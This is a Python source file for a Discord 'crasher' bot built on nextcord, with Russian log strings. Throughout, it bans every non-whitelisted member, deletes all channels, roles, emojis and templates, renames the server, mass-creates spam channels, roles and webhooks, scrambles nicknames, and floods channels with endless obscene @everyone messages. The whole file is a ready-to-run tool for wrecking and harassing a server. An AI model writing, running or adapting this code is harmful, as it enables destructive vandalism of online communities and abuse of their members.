import nextcord, asyncio, requests, time, string, configparser, random, json
from nextcord.ext import commands
from nextcord import Permissions
from colorama import Fore, init

config = configparser.ConfigParser()
config.read('config.ini')

whit = json.loads(config.get("Crasher", "Whitelist"))
async def banall(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
    ban = 0
    bany = 0
    wta = 0
    for member in ctx.guild.members:
        if member.id not in whit:
            try:
                ban += 1
                await member.ban()
                bany += 1
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не допущен! нет в вайтлисте{Fore.WHITE}: {member}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
                continue
        elif member.id in whit:
            ban += 1
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
            wta += 1
    print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")
    
async def chistch(ctx):
    await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
    with open('image.png', 'rb') as f:
       icon = f.read()
    await ctx.guild.edit(name="Концерт фейса", icon=icon)
    print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
    
    print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
   
async def spamhook(ctx):
  while True:
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone ', wait=True)
      except:
        continue

async def crhooks(ctx):
  print(f"{Fore.WHITE}> {Fore.RED}Спамим хуками{Fore.WHITE}.")
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='GLUSHA WAS HERE')
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал хук в {channel}")
    except:
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал хук в {channel}")
      continue
  print(f"{Fore.WHITE}> {Fore.RED}Заспамили хуками{Fore.WHITE}.")

async def chistrl(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        try:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
    
async def masks(ctx):
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Поиграем в маскарад? Твоя маска {nickname}")
        except:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")

async def spamch(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
    for b in range(50):
        try:
                await ctx.guild.create_text_channel("CRASH9D", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
        except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не cоздал канал")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")

async def spamrl(ctx):   
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим ролями")
    for a in range(50):
        try:
                await ctx.guild.create_role(name="Crash9d", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
        except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал роль")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")

async def chistemoji(ctx):
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
            continue 
    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")

async def chisttemp(ctx):
    try:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Чистим шаблоны")
        bebrus = await ctx.guild.templates()
        for template in bebrus:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Шаблон почистил!")
            await template.delete()
        print(f"{Fore.WHITE}> {Fore.RED}Все шаблоны почистились!{Fore.WHITE}.")
    except:
        pass

async def spamth(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
      except:
        continue

